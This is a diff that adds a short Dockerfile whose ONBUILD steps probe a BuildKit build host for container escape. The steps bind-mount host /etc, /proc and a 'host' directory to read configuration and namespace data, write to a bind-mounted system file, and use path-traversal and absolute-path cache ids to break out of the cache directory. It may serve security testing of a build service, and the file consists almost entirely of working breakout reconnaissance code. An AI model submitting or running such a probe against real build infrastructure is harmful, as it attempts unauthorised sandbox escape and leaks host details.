@@ -1,0 +1,11 @@
+FROM alpine:3.20 AS base
+ONBUILD RUN --mount=type=bind,source=etc,target=/he sh -c 'set +e; echo "===D2_ETC==="; cat /he/hostname; ls -la /he/os-release /he/debian_version /he/motd /he/issue 2>&1; echo "--toml_full--"; cat /he/buildkit/buildkitd.toml 2>&1; echo "--cni--"; cat /he/buildkit/cni.conflist 2>&1; echo "===D2_ETC_END==="'
+ONBUILD RUN --mount=type=bind,source=proc,target=/hp sh -c 'set +e; echo "===D2_PROC==="; echo -n "P1CMD="; tr "\\0" " " < /hp/1/cmdline 2>&1; echo; echo "--P1STAT--"; head -6 /hp/1/status 2>&1; echo "--NS--"; ls -l /hp/1/ns 2>&1 | head -12; echo "--hostns--"; readlink /hp/1/ns/mnt /hp/self/ns/mnt /hp/1/ns/pid /hp/self/ns/pid 2>&1; echo "===D2_PROC_END==="'
+ONBUILD RUN --mount=type=bind,source=host,target=/hh sh -c 'set +e; echo "===D2_HOST==="; ls -la /hh 2>&1 | head -25; echo "--hh_proc--"; ls /hh/proc 2>&1 | head -5; echo "===D2_HOST_END==="'
+ONBUILD RUN --mount=type=bind,source=etc/debian_version,target=/dv,rw sh -c 'set +e; echo "===D2_FILEBIND==="; grep " /dv " /proc/self/mountinfo; echo -n "orig="; cat /dv; echo; stat -c "dev=%d ino=%i mode=%a" /dv; echo -n "newwrite=i67256-" > /dv 2>&1; echo "wr_rc=$?"; cat /dv; echo; echo "===D2_FILEBIND_END==="'
+ONBUILD RUN --mount=type=cache,id=i67256cacheA,target=/c sh -c 'set +e; echo "===D2_CACHE==="; grep " /c " /proc/self/mountinfo; ls -la /c | head; echo "m=i67256-cacheA-$(date +%s)" > /c/m1; cat /c/m1; echo "===D2_CACHE_END==="'
+ONBUILD RUN --mount=type=cache,id=../../../../../../tmp/i67256trav,target=/t sh -c 'set +e; echo "===D2_TRAV==="; grep " /t " /proc/self/mountinfo; ls -la /t | head -5; echo x > /t/tm 2>&1; echo "rc=$?"; cat /t/tm 2>&1; echo "===D2_TRAV_END==="'
+ONBUILD RUN --mount=type=cache,id=/tmp/i67256abs,target=/a sh -c 'set +e; echo "===D2_ABS==="; grep " /a " /proc/self/mountinfo; echo y > /a/am 2>&1; echo "rc=$?"; cat /a/am 2>&1; echo "===D2_ABS_END==="'
+FROM base
+RUN sh -c 'echo ===D2_TRIGGER===; id'
+CMD ["sh","-c","sleep 20"]
